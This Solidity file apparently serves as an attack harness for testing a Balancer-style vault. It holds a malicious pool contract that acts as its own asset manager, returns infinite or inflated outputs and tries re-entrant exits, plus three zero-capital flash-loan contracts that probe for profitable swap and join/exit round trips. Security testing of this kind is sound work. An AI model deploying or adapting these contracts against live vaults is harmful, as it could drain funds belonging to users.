// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "./interfaces.sol";

/// @dev Malicious Balancer-style pool registered by an unprivileged attacker.
contract AttackerPool {
    IVault public vault;
    address public tokenA;
    address public tokenB;
    bytes32 public poolId;
    bytes32 public stablePoolId;
    bool public doReenter;
    bool public huge;
    bool public reenterSucceeded;

    constructor(IVault _vault, address _a, address _b) {
        vault = _vault;
        tokenA = _a;
        tokenB = _b;
    }

    function register(uint8 spec) external returns (bytes32) {
        poolId = vault.registerPool(spec);
        address[] memory toks = new address[](2);
        toks[0] = tokenA;
        toks[1] = tokenB;
        address[] memory mgrs = new address[](2);
        mgrs[0] = address(this); // attacker is its own asset manager
        mgrs[1] = address(this);
        vault.registerTokens(poolId, toks, mgrs);
        return poolId;
    }

    function setFlags(bool _doReenter, bool _huge) external {
        doReenter = _doReenter;
        huge = _huge;
    }

    function setStablePool(bytes32 pid) external {
        stablePoolId = pid;
    }

    // ---- extraction attempts ----

    function tryManagedUpdate(uint256 amount) external {
        IVault.PoolBalanceOp[] memory ops = new IVault.PoolBalanceOp[](1);
        ops[0] = IVault.PoolBalanceOp(2, poolId, tokenA, amount); // UPDATE managed balance
        vault.managePoolBalance(ops);
    }

    function tryManagedWithdraw(uint256 amount) external {
        IVault.PoolBalanceOp[] memory ops = new IVault.PoolBalanceOp[](1);
        ops[0] = IVault.PoolBalanceOp(0, poolId, tokenA, amount); // WITHDRAW cash -> caller
        vault.managePoolBalance(ops);
    }

    function _selfExitReq() internal view returns (IVault.ExitPoolRequest memory) {
        address[] memory toks = new address[](2);
        toks[0] = tokenA;
        toks[1] = tokenB;
        uint256[] memory mins = new uint256[](2);
        return IVault.ExitPoolRequest(toks, mins, abi.encode(uint256(0), uint256(1e18)), false);
    }

    function tryExitHuge() external {
        huge = true;
        vault.exitPool(poolId, address(this), payable(address(this)), _selfExitReq());
    }

    function tryExitZeros() external {
        huge = false;
        vault.exitPool(poolId, address(this), payable(address(this)), _selfExitReq());
    }

    function trySwapHuge() external {
        IVault.SingleSwap memory s =
            IVault.SingleSwap(poolId, IVault.SwapKind.GIVEN_IN, tokenA, tokenB, 1e18, "");
        IVault.FundManagement memory f =
            IVault.FundManagement(address(this), false, payable(address(this)), false);
        vault.swap(s, f, 0, block.timestamp + 1);
    }

    // ---- malicious pool hooks ----

    function onSwap(IVault.SingleSwap memory, uint256[] memory, uint256, uint256)
        external
        view
        returns (uint256)
    {
        return type(uint256).max; // claim infinite output
    }

    function onJoinPool(bytes32, address, address, uint256[] memory, uint256, uint256, bytes memory)
        external
        pure
        returns (uint256[] memory, uint256[] memory)
    {
        uint256[] memory ins = new uint256[](2);
        uint256[] memory fees = new uint256[](2);
        return (ins, fees);
    }

    function onExitPool(bytes32, address, address, uint256[] memory, uint256, uint256, bytes memory)
        external
        returns (uint256[] memory, uint256[] memory)
    {
        if (doReenter) {
            address[] memory toks = new address[](2);
            toks[0] = tokenA;
            toks[1] = tokenB;
            uint256[] memory mins = new uint256[](2);
            IVault.ExitPoolRequest memory req =
                IVault.ExitPoolRequest(toks, mins, abi.encode(uint256(0), uint256(1e18)), false);
            try vault.exitPool(stablePoolId, address(this), payable(address(this)), req) {
                reenterSucceeded = true;
            } catch {
                reenterSucceeded = false;
            }
        }
        uint256[] memory outs = new uint256[](2);
        if (huge) {
            outs[0] = 1_000_000e18;
            outs[1] = 1_000_000e18;
        }
        uint256[] memory fees = new uint256[](2);
        return (outs, fees);
    }
}

/// @dev Zero-capital flash-loan round tripper: if the path loses money, repayment reverts.
contract FlashRoundTripper is IFlashLoanRecipient {
    IVault public vault;
    address public immutable usdt;
    address public immutable usdc;
    address public immutable busd;
    uint8 public mode; // 0: USDT->USDC->USDT, 1: USDT->USDC->BUSD->USDT
    uint256 public returnedProfit;

    constructor(IVault _v, address _usdt, address _usdc, address _busd) {
        vault = _v;
        usdt = _usdt;
        usdc = _usdc;
        busd = _busd;
    }

    function run(bytes32 poolId, uint256 amount, uint8 _mode) external {
        mode = _mode;
        address[] memory toks = new address[](1);
        toks[0] = usdt;
        uint256[] memory amts = new uint256[](1);
        amts[0] = amount;
        vault.flashLoan(address(this), toks, amts, abi.encode(poolId));
    }

    function _swap(bytes32 poolId, address tin, address tout, uint256 amount) internal returns (uint256) {
        IERC20(tin).approve(address(vault), amount);
        IVault.SingleSwap memory s = IVault.SingleSwap(poolId, IVault.SwapKind.GIVEN_IN, tin, tout, amount, "");
        IVault.FundManagement memory f =
            IVault.FundManagement(address(this), false, payable(address(this)), false);
        return vault.swap(s, f, 0, block.timestamp + 1);
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external override {
        require(msg.sender == address(vault), "not vault");
        bytes32 poolId = abi.decode(userData, (bytes32));
        uint256 amount = amounts[0];

        if (mode == 0) {
            uint256 usdcOut = _swap(poolId, usdt, usdc, amount);
            _swap(poolId, usdc, usdt, usdcOut);
        } else {
            uint256 usdcOut = _swap(poolId, usdt, usdc, amount);
            uint256 busdOut = _swap(poolId, usdc, busd, usdcOut);
            _swap(poolId, busd, usdt, busdOut);
        }

        uint256 owed = amount + feeAmounts[0];
        uint256 bal = IERC20(usdt).balanceOf(address(this));
        require(bal >= owed, "unprofitable: cannot repay flash loan");
        IERC20(usdt).transfer(address(vault), owed);
        returnedProfit = bal - owed;
    }
}

/// @dev Zero-capital flash-funded join -> immediate proportional exit.
contract FlashJoiner is IFlashLoanRecipient {
    IVault public vault;
    address public immutable usdt;
    address public immutable usdc;
    address public immutable busd;
    address public immutable pool;
    bytes32 public immutable pid;
    uint256 public returnedProfit;

    constructor(IVault _v, address _usdt, address _usdc, address _busd, address _pool, bytes32 _pid) {
        vault = _v;
        usdt = _usdt;
        usdc = _usdc;
        busd = _busd;
        pool = _pool;
        pid = _pid;
    }

    function run(uint256 a, uint256 b, uint256 c) external {
        address[] memory toks = new address[](3);
        toks[0] = usdt;
        toks[1] = usdc;
        toks[2] = busd;
        uint256[] memory amts = new uint256[](3);
        amts[0] = a;
        amts[1] = b;
        amts[2] = c;
        vault.flashLoan(address(this), toks, amts, "");
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external override {
        require(msg.sender == address(vault), "not vault");
        address[] memory assets = new address[](3);
        assets[0] = usdt;
        assets[1] = usdc;
        assets[2] = busd;

        uint256[] memory maxIns = new uint256[](3);
        maxIns[0] = amounts[0];
        maxIns[1] = amounts[1];
        maxIns[2] = amounts[2];
        bytes memory joinData = abi.encode(uint256(1), amounts, uint256(0)); // EXACT_TOKENS_IN_FOR_BPT_OUT
        vault.joinPool(pid, address(this), address(this), IVault.JoinPoolRequest(assets, maxIns, joinData, false));

        uint256 bpt = IERC20(pool).balanceOf(address(this));
        uint256[] memory minOuts = new uint256[](3);
        bytes memory exitData = abi.encode(uint256(0), bpt); // EXACT_BPT_IN_FOR_TOKENS_OUT
        vault.exitPool(
            pid, address(this), payable(address(this)), IVault.ExitPoolRequest(assets, minOuts, exitData, false)
        );

        for (uint256 i = 0; i < 3; i++) {
            uint256 owed = amounts[i] + feeAmounts[i];
            uint256 bal = IERC20(tokens[i]).balanceOf(address(this));
            require(bal >= owed, "unprofitable join/exit");
            IERC20(tokens[i]).transfer(address(vault), owed);
            returnedProfit += bal - owed;
        }
    }
}

/// @dev Zero-capital 3-hop batchSwap round trip ending in the borrowed token.
contract FlashBatch is IFlashLoanRecipient {
    IVault public vault;
    address public immutable usdt;
    address public immutable usdc;
    address public immutable busd;
    uint256 public returnedProfit;

    constructor(IVault _v, address _usdt, address _usdc, address _busd) {
        vault = _v;
        usdt = _usdt;
        usdc = _usdc;
        busd = _busd;
    }

    function run(bytes32 pid, uint256 amount) external {
        address[] memory toks = new address[](1);
        toks[0] = usdt;
        uint256[] memory amts = new uint256[](1);
        amts[0] = amount;
        vault.flashLoan(address(this), toks, amts, abi.encode(pid));
    }

    function receiveFlashLoan(
        address[] memory,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external override {
        require(msg.sender == address(vault), "not vault");
        bytes32 pid = abi.decode(userData, (bytes32));
        uint256 amount = amounts[0];

        address[] memory assets = new address[](3);
        assets[0] = usdt;
        assets[1] = usdc;
        assets[2] = busd;

        IVault.BatchSwapStep[] memory steps = new IVault.BatchSwapStep[](3);
        steps[0] = IVault.BatchSwapStep(pid, 0, 1, amount, ""); // USDT -> USDC
        steps[1] = IVault.BatchSwapStep(pid, 1, 2, 0, ""); // USDC -> BUSD (chained)
        steps[2] = IVault.BatchSwapStep(pid, 2, 0, 0, ""); // BUSD -> USDT (chained)

        int256[] memory limits = new int256[](3);
        limits[0] = type(int256).min; // allow profit, block loss (net-in > limit reverts)
        limits[1] = 0;
        limits[2] = 0;

        IVault.FundManagement memory f =
            IVault.FundManagement(address(this), false, payable(address(this)), false);
        vault.batchSwap(0, steps, assets, f, limits, block.timestamp + 1); // 0 = GIVEN_IN

        uint256 owed = amount + feeAmounts[0];
        uint256 bal = IERC20(usdt).balanceOf(address(this));
        require(bal >= owed, "unprofitable batch round trip");
        IERC20(usdt).transfer(address(vault), owed);
        returnedProfit = bal - owed;
    }
}
